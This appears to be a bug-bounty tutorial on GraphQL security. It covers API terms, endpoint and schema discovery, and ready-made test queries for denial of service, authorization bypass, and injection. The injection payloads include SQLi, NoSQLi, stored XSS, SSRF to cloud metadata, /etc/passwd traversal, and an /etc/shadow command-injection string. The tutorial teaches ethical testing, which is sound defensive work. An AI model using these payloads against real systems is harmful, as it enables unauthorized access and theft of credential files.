# What is GraphQL ?

GraphQL is basically a smarter way for apps to talk to APIs. Instead of having tons of different endpoints like `/users`, `/posts`, `/orders`, GraphQL gives you **one single endpoint** where you can ask for exactly the data you want.

Think of it like placing a custom order at a restaurant instead of picking from fixed combos.

**Example:**
```graphql
query {
  user(id: "123") {
    name
    email
  }
}
```
**REST**: Ordering a combo meal… even if you only want the burger.

**GraphQL**: Telling the chef “just give me a burger and a coke, nothing else.”

# **Terminologies** :
### 1. Query
- A **query** is how you ask for data.
- You specify **exactly what fields** you want.

**Example:**
```graphql
query {
  user(id: "123") {
    name
    email
  }
}
```
- This will return only the user's `name` and `email`.

### 2. Mutation:
- **Mutation** is how you create, update, or delete data.
- Think of it like sending a request that **changes something**.

Example:
```graphql
mutation {
  createUser(name: "Alice", email: "alice@example.com") {
    id
    name
  }
}
```
- This adds a new user and returns their `id` and `name`.

### 3.  Subscription:
- A **subscription** is like a live feed. You get notified when something changes.
- Useful for chats, notifications, dashboards, etc.

Example:
```graphql
subscription {
  newMessage {
    id
    text
    sender
  }
}
```
- Every time a new message is sent, you’ll get it automatically.

### 4. Resolver:
- **Resolver** is the function behind the scenes that **fetches or changes the data**.
- If you query `user(name)`, the resolver decides how to get it from the database or API.

### 5. Schema:
- **Schema** is like the **blueprint** of the API.
- Defines **types**, **queries**, **mutations**, and **relationships**.

- **Example**: it tells you a `User` has `id`, `name`, and `email`.

### 6. Type:
- Types define **what kind of data** can exist.
- Common ones: `String`, `Int`, `Boolean`, `ID`, and custom types like `User` or `Post`.


# **Recon**: 

GraphQL recon is honestly one of the *easiest* and most fun parts because once you find the GraphQL endpoint, everything opens up.

### **1. Find the GraphQL Endpoint**
GraphQL usually lives at common paths like:
- `/graphql`
- `/api/graphql`
- `/v1/graphql`
- `/graphiql` (UI)
- `/playground` (UI)

Try visiting them in the browser or sending a simple POST request.

**Quick test (Burp or curl):**
```json
{"query":"{ __typename }"}
```
If you get a response → the endpoint exists.

### **2. Test If Introspection Is Enabled**
- Introspection is basically GraphQL’s “show me the entire API structure.”  
- If it’s enabled in production → jackpot.

**Send:**
```graphql
{   
	__schema {     
		types {       
			name     
			}   
			} 
}
```
- If it works, you can explore everything: queries, mutations, types, fields, parameters, etc.
- You can then get the introspection response and slam it in a visualization tool GraphQL Voyager.

## **3. Errors spilling information:**
- So, there can be instances where organizations may disable the introspection queries. In that case we can look at the errors generated to dig upon the schema details .

- Example
```json
{
  "errors": [
    {
      "message": "Cannot query field \"address\" on type \"User\". Did you mean \"addresses\"?"
    }
  ]
}

```

- A tool like **Clairvoyance** can be used to bruteforce and extract **GraphQL** schemas.

# **Testing for Weaknesses:**

## **DOS Attacks** :
- GraphQL is powerful… sometimes _too_ powerful.  
- Because it lets clients shape the data however they want, attackers can craft queries that quietly overwhelm the server. No bots, no floods — sometimes **one clever query** can knock the whole API offline.

- This is why DoS testing in GraphQL is extra important (and extra risky). A single request can blow things up if the backend isn't prepared.

### 1. **Alias Abuse:**
- Aliases let you call the same field repeatedly within one request. Attackers love this.
```graphql
query {
  alias1: expensiveField(arg: 1)
  alias2: expensiveField(arg: 1)
  alias3: expensiveField(arg: 1)
  # …alias100
}
```

- One request = 100 resolver executions.  
- Great for DoS, enumeration, or just being evil.

### **2. Query Nesting:**
- This is the classic GraphQL DoS trick.
```graphql
query {
  obj {
    child {
      grandchild {
        greatGrandchild {
          # ...and so on
        }
      }
    }
  }
}
```

### **3. Circular Reference Abuse:**
- In situations where the backend didn't plan for circular references properly which yon can easily find using the schema that we found during our Recon. Just try finding Objects that have references to each other **( Circular References )** .
- Try fetching recursive structures with increasing depth.

```graphql
user {
  friends {
    friends {
      friends {
        # infinite sadness
      }
    }
  }
}
```



## **Authorization Bypasses :**

- Authorization bugs are the _real jackpots_ in GraphQL.
- They happen when the API fails to check whether the user **is allowed** to run a mutation or access certain data.

It’s not about _who you are_ — it’s about _what you’re allowed to do_.  
And when GraphQL forgets to enforce those rules, attackers get access to actions or data they should never see.


### **1. Function-Level Authorization:**
- “Can I run this mutation at all?”
- **How to test:**
1. Look at the schema → identify mutations that sound privileged:
    - `updateUser`
    - `deleteAccount`
    - `promoteToAdmin`
    - `setConfiguration`
    - `resetPasswordForUser`
2. Try running them with a normal user token.
- If the mutation **succeeds instead of failing with “Unauthorized”**, you’ve found a serious authorization flaw.

### **2. Object-Level Authorization (BOLA):**
- “Can I modify or view someone else’s stuff?”
- GraphQL makes BOLA testing extremely easy because many mutations take IDs:

```
updatePost(id: "postID", ...)
```

If there’s no ownership check, you can point the mutation at another user’s ID.

**What to try:**
- Take a mutation that accepts an `id`.
- Use the ID of another user’s object.
- Does it update? Delete? Return data?

**If yes → that’s BOLA**, one of the highest-impact bug classes.

**Same for queries:**
```graphql
query {   user(id: "victimID") {     email     phone   } }
```
If you get data that doesn’t belong to you → major leak.


### **3. Field-Level Authorization:**
- **“Can I read or modify fields I shouldn’t have access to?”**
- Even if the object is allowed, certain fields should NOT be exposed.
- Look out for fields like:
	- `isAdmin`
	- `role`
	- `email`
	- `ownerId`
	- `internalNotes`
	- `permissions`
	- 
Try fetching them or modifying them.

#### **# Reading Sensitive Fields**

```graphql

query{   
	user(id: "myID")
	{     
	 id     
	 email     
	 role     
	 isAdmin   
	} 
}
```
If the API returns restricted fields → field-level authorization is missing.

#### **# Modifying Sensitive Fields**

```
mutation{   
	updateUser(id: "myID" input: { isAdmin: true })
	{     
	  id     
	  isAdmin   
	} 
}
```

If the server accepts this change → HUGE vulnerability (privilege escalation).


# Resolver Vulnerabilities:
- GraphQL resolvers eventually run backend code — which means all the traditional vulnerabilities still apply. Attackers just use GraphQL arguments as the input vector.
##  1. SQL Injection in Filters

```
query
{   
	products(filter: "price < 100 OR 1=1") 
	{     
		id     
		name     
		price   
	} 
}
```


If all products show up → SQLi vulnerability confirmed.

---

## 2. NoSQL Injection (MongoDB, DynamoDB, etc.)

```
query {   
	user(filter: { username: { $ne: null } }) 
	{     
	  id     
	  username   
	} 
}
```

If this returns every user → the API is not sanitizing NoSQL operators.

---

## 3. Stored XSS via Mutations

```
mutation {   
	createComment(input: {text: "<img src=x onerror=alert('XSS from GraphQL!')>"  }) 
{     
  id   
  } 
}
```

Stored XSS happens if this payload executes later on the frontend.

---

## 4️. SSRF via URL Arguments

```
mutation {
uploadFromUrl(url: "http://169.254.169.254/latest/meta-data/") 
}
```

If the server fetches this URL → SSRF confirmed.

---

## 5️. Path Traversal / LFI

`query {   readLog(path: "../../../etc/passwd") }`

If you get system files back → LFI is possible.

---

## 6️. Command Injection via Unvalidated Arguments

`mutation {   runBackup(target: "backup.zip; cat /etc/shadow") }`

If the backend actually runs this — that’s RCE.

---

## 7️. Server-Side Template Injection (SSTI)

`mutation {   createEmailTemplate(name: "{{7*6}}") {     id     name   } }`

If it returns `42`, the server is evaluating templates.




GraphQL is powerful. It’s flexible, fast, developer-friendly, and honestly a joy to work with… **until someone forgets to secure it**.  
Because of how “open” GraphQL is by design — introspection, nested queries, custom resolvers, complex inputs — it becomes a playground for attackers if the backend doesn’t enforce strict controls.

The goal of bug bounty hunting in GraphQL isn’t just to throw payloads at the wall.  
It’s to **think like the developers**:

- “Did they restrict this field?”
- “Did they forget to check ownership here?”
- “Is this resolver doing something sketchy with my input?”
- “Can I ask the server to do _way more work_ than it should?”

Once you start asking the right questions, GraphQL vulns start popping up everywhere.

If there’s one thing you should take away from this guide, it’s this:

👉 **GraphQL isn’t insecure — but insecure GraphQL implementations can be catastrophic.**  

Keep experimenting, keep learning, and most importantly — keep breaking things (ethically).  
Happy hunting! 🐞🔥